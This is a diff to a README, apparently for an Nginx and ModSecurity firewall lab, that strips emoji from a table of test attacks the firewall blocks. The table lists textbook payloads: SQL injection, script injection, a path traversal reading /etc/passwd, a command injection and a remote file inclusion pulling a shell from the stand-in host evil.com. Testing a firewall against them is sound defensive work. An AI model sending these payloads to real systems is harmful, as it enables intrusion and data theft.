@@ -101,12 +101,12 @@ Internet → Ngrok Tunnel → Nginx + ModSecurity (Port 80)
 
 | Attack Type | Example Payload | Result |
 |-------------|----------------|--------|
-| SQL Injection | `/?id=1' OR '1'='1` | ✅ BLOCKED (403) |
-| Cross-Site Scripting (XSS) | `/?q=<script>alert(1)</script>` | ✅ BLOCKED (403) |
-| Path Traversal | `/?file=../../etc/passwd` | ✅ BLOCKED (403) |
-| Command Injection | `/?cmd=;ls -la` | ✅ BLOCKED (403) |
-| Remote File Inclusion | `/?url=http://evil.com/shell.php` | ✅ BLOCKED (403) |
-| Scanner Detection | Nikto, Nmap HTTP scan | ✅ BLOCKED (403) |
+| SQL Injection | `/?id=1' OR '1'='1` |  BLOCKED (403) |
+| Cross-Site Scripting (XSS) | `/?q=<script>alert(1)</script>` |  BLOCKED (403) |
+| Path Traversal | `/?file=../../etc/passwd` |  BLOCKED (403) |
+| Command Injection | `/?cmd=;ls -la` |  BLOCKED (403) |
+| Remote File Inclusion | `/?url=http://evil.com/shell.php` |  BLOCKED (403) |
+| Scanner Detection | Nikto, Nmap HTTP scan |  BLOCKED (403) |
 
 ---
 
